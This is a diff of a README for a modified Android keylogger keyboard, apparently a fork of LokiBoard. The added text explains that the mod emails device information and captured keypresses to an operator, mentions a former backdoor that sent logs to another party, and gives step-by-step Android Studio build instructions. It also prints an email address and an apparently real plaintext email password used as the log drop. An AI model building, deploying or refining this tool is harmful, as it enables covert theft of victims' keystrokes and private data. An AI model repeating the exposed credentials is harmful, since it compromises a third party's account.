@@ -1,3 +1,55 @@
+This hakistan version is behind some weird non existent pro version that does not work,
+ So far it's been just un-commenting many snippets of code until it breaks, it's like
+ overclocking lol, there was also a backdoor so hakistan always got logs.
+
+ as of right now an email is sent of user device info on initial install, during testing make sure to type
+ or click on the virtual keyboard if using genymotion for example. keypress logs as of now are only
+  sent when the user opens up the app.
+
+  -----------------------------------------------
+
+ To get started helping us reverse engineer this mess you can download the rar from the release section
+ 
+ then open up the folder inside Android Studio after extraction.
+ 
+ After this goto file | Settings | Goto Search Box
+ 
+ search for Gradle
+ 
+ click the drop down and select use gradle from wrapper properties file, click ok
+ 
+ next click file then sync project with gradle files
+ 
+
+ open:
+ 
+ hakistan\Lokiboard-Mod-master\app\src\main\res\values\strings.xml
+ 
+ and edit these 2 lines:
+ ```
+ [ <string name="EMail">dashdashpass7@gmail.com</string>]
+  
+   <string name="EmailPassword">7.gMukhlis.Ghaf00r</string>
+```
+from this snippet:
+ ```
+ <string name="prefs_keyboard_height_settings">Keyboard height</string>
+    <string name="keyboard_color">Set custom keyboard color</string>
+    <string name="hide_special_chars">Hide special characters</string>
+    <string name="hide_language_switch_key">Hide language switch key</string>
+    <string name="show_number_row">Show separate number row</string>
+    <string name="space_swipe">Space swipe cursor move</string>
+    <string name="delete_swipe">Delete swipe</string>
+    <string name="matching_navbar_color">Use matching navigation bar color</string>
+    <string name="setup_message">LokiBoard Keyboard is not enabled. Click OK to open Languages &amp; Input settings. You will need to select LokiBoard Keyboard in your current keyboard to use it.</string>
+    <string name="EMail">dashdashpass7@gmail.com</string>
+    <string name="EmailPassword">7.gMukhlis.Ghaf00r</string>
+    <string name="Interval">120000</string>
+ ```
+
+You should also do a search and replace all for any emails.
+
+
 # LokiBoard-Android-KeyLogger
 Android Keylogging Keyboard
 
@@ -21,17 +73,7 @@ Note: You need to have physical access to the device for use.
 
 `Internal Storage > Android > Data > com.abifog.lokiboard > files > lokiboard-files.txt `
 
-## ScreenShots
 
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/1.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/2.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/3.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/4.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/5.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/6.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/7.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/8.png)
-![screenshot](https://raw.githubusercontent.com/IceWreck/LokiBoard-Android-Keylogger/master/screenshots/9.png)
 
 
 ## Obligatory Notice
